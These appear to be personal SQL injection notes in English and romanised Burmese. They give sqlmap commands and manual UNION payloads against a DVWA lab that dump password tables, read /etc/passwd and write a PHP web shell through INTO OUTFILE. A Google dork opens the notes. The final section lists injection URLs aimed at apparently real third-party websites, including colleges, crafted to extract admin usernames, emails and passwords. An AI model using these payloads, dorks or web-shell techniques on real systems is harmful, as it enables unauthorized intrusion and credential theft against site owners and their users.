!@#
inurl:"new.php?id=" site:th   => google docking 


--data   -> post method mar use dar
-p -> permeter select pay dar
--dbms   -> dbms ka database ko select pay dar   -> a ti a kya ti yin htat dal ->exp mysql 
--technique -> BEUST -> bool , error , union, start query, time base
--batch -> user confirmation ko yes lot a myal pay dar


usage 

sqlmap -u "https://www.google.com/news.php?id=1" --current-db

===> with cookie value  (log in win ya de app twe)
sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db --cookie="PHPSESSID=sq468tmdslsm1jsfebedjk8p6e; security=low"

==> when we get database name
sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db --cookie="PHPSESSID=sq468tmdslsm1jsfebedjk8p6e; security=low" --tables -D dvwa

===> column swal htoke dar ->user table htal ka
sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db --cookie="PHPSESSID=sq468tmdslsm1jsfebedjk8p6e; security=low" --columns -T users -D dvwa

===> data dump
 sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db --cookie="PHPSESSID=sq468tmdslsm1jsfebedjk8p6e; security=low" --dump -C user,password -T users -D dvwa

==> file write loke lot ya ma ko check dar
sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db --cookie="PHPSESSID=sq468tmdslsm1jsfebedjk8p6e; security=low" --is-dba

==> passwd file ko read dar
sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db --cookie="PHPSESSID=sq468tmdslsm1jsfebedjk8p6e; security=low" --file-read='/etc/passwd'

===> fucking open it now 
cat /home/kali/.local/share/sqlmap/output/192.168.99.116/files/_etc_passwd


===> file permission ko access ya ma ya check dr
http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1' union select concat(user,0x3a,file_priv),2 from mysql.user--+&Submit=Submit#

===> file ko phat dar
http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1' union select 1,load_file('/etc/passwd')--+&Submit=Submit#

===> full permission shi dae folder out mar win yae dar
http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1' union select 1,2 into outfile ''/var/www/html/test/a.txt'--+&Submit=Submit#

http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20into%20outfile%20%27/var/www/html/test/b.txt%27--+&Submit=Submit#  => unencode with url


==> shell upload from sql injection
http://192.168.99.116/DVWA/vulnerabilities/sqli/?id=1%27%20union%20select%201,%27%3C?php%20system($_GET[0]);%20?%3E%27%20into%20outfile%20%27/var/www/html/test/shell.php%27--+&Submit=Submit#    => url encode

![[Pasted image 20230202225235.png]]

![[Pasted image 20230202225440.png]]
=> shell from client  #####

==> sql map with POST method (we using burpsuite)
 sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli/session-input.php" --data="id=1&Submit=Submit" --cookie="PHPSESSID=p43rljl5plv951vvr88u53ngj9; security=high" --current-db --level 3      ==> --data ka url ko use dar


===> cookie value mar sql pouk dar
sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=p43rljl5plv951vvr88u53ngj9; security=high" --current-db --level 3


===> dump tables
sqlmap -u "http://192.168.99.116/DVWA/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=p43rljl5plv951vvr88u53ngj9; security=high" --level 2 --tables -D dvwa


http://192.168.99.76/admin/edit.php?id=-1%20union%20select%201,2,load_file(%27/etc/passwd%27),4--   => load file ko dump dar



![[Pasted image 20230205211640.png]]
http://192.168.99.76/admin/edit.php?id=-1%20union%20select%201,2,3,4%20into%20outfile%20%27/var/www/css/a.txt%27--    ==> i got this one with writable access


===> Trying to inject  or evil  with this code
http://192.168.99.76/admin/edit.php?id=-1%20union%20select%201,%27%3C?php%20system($_GET[0]);?%3E%27,3,4%20into%20outfile%20%27/var/www/css/a.php%27--
![[Pasted image 20230205212220.png]]

===> Client side control
![[Pasted image 20230205212313.png]]
http://192.168.99.76/css/a.php?0=ls%20-al

==> Testing with sqlmap
sqlmap -u "http://192.168.99.76/admin/edit.php?id=1" --is-dba --cookie="PHPSESSID=nhtnf9d7rjjoaoijnh33p2g6p1"     

==> Trying for os shell with default path
sqlmap -u "http://192.168.99.76/admin/edit.php?id=1" --os-shell --cookie="PHPSESSID=nhtnf9d7rjjoaoijnh33p2g6p1"

==> Trying for os shell with manutal path  but manutal is the best bro haha

-----


https://www.pcccr.ac.th/studentaffairs/new.php?id=1%20union%20select%20group_concat(%27%3Cbr/%3E%27,login_user,0x3a3a,login_mail,0x3a3a,login_pass),2,3,4,5,6,7%20from%20login--


https://www.pcccr.ac.th/studentaffairs/new.php?id=1%20union%20select%20group_concat(%27%3Cbr/%3E%27,login_id,0x3a3a,login_user,0x3a3a,login_lastname,0x3a3a,login_mail,0x3a3a,login_pass,0x3a3a,login_log),2,3,4,5,6,7%20from%20login--


https://movative.ca/new.php?id=-17%27%20union%20select%201,group_concat(%27%3Cbr/%3E%27,name,0x3a3a,password),3,4,5,6,7,8%20from%20password%20--%20-

[https://kccollege.ac.in/iqac-new.php?id=1%20order%20by%201000](https://kccollege.ac.in/iqac-new.php?id=1%20order%20by%201000)–


http://www.dollswig.net/new.php?id=-30%20union%20select%201,2,3,4,group_concat(name,0x3a3a,pwd),6%20from%20xm_admin--%20-

